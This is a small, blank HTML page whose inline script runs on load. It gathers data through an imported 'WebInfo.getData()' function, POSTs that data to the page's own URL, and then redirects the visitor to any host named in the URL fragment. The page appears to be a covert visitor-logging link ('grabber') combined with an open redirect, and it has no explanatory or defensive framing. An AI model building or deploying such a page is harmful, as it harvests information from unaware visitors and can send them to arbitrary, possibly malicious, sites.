<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script type="module">
        import { WebInfo } from './script.js';
        (async function(){
            var data = await WebInfo.getData();
            var req = new XMLHttpRequest();
            req.open('POST', window.location.href, true);
            req.setRequestHeader('Content-Type', 'application/json');
            req.send(JSON.stringify(data));
            if(window.location.hash) window.location.href = 'https://' + window.location.hash.replace(/^#/, '');
        })();
    </script>
    <title></title>
</head>
<body>
    
</body>
</html>
